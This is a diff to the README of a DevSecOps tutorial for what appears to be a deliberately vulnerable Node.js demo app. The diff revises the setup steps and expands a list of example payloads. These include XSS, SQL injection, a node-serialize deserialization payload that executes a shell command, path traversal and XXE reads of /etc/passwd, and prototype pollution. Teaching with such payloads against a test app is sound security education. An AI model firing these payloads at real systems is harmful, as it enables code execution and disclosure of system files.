@@ -18,19 +18,21 @@ Before you begin, ensure you have the following:
 
 ### Local Setup
 
-1. Clone the repository:
+1. Fork this repository
+2. Clone your fork:
    ```
-   git clone https://github.com/Kisielos10/DevSecOps_Tutorial.git
+   git clone <your_fork>.git
    ```
-2. Navigate to the project directory:
+3. Navigate to the project directory:
    ```
    cd DevSecOps_Tutorial
    ```
-3. Install dependencies:
+4. Delete all workflows
+5. Install dependencies:
    ```
    npm install
    ```
-4. Run the application:
+6. Run the application:
    ```
    node app.js
    ```
@@ -63,25 +65,57 @@ You can experiment with the demo instance at https://simple-devsecops-app.azurew
 
 ### DAST with ZAP
 
-1. Utilise the provided `zap_scan.yml` file
+1. Utilise the provided `zap_scan.yml` file from this repository
 2. Change the URL to your own application's URL
 3. Results will appear as an artifact on GitHub
 
 ### Linting
 
-Explore the linting configuration and consider how to improve it.
+TODO
+
+### Tests
+
+TODO
+
+### CodeQL
+
+TODO
 
 ## Example Payloads
 
-1. XSS: `<img src=x onerror="alert('XSS Attack!')">`
-2. SQLi: `SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything' OR admin' –`
+1. XSS: `<img src=x onerror="alert('XSS')">`
+2. SQLi: `OR admin' –`
 3. Broken auth: Click on the admin panel
-4. Insecure Deserialization: 
+4. Insecure Deserialization (will not be displayed): 
    ```json
    {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}()"}
    ```
 5. Security misconfiguration: Access the Debug info for sensitive information
 6. Unrestricted file upload: Try uploading various file types
+7. Command injection: `ping google.com`
+8. Weak Cryptography: just encrypt anything -> DES in considered insecure
+9. Path Traversal: `../../../etc/passwd`
+10. XXE (will not be displayed):
+   ```
+   <?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+   <root>
+      <data>&xxe;</data>
+   </root>
+   ```
+11. Prototype Pollution (will not be displayed):
+   ```
+   {
+   "target": {},
+   "source": {
+      "__proto__": {
+         "polluted": "Prototype has been polluted!"
+      }
+   }
+   }
+   ```
+
+
 
 ## Further Learning
 
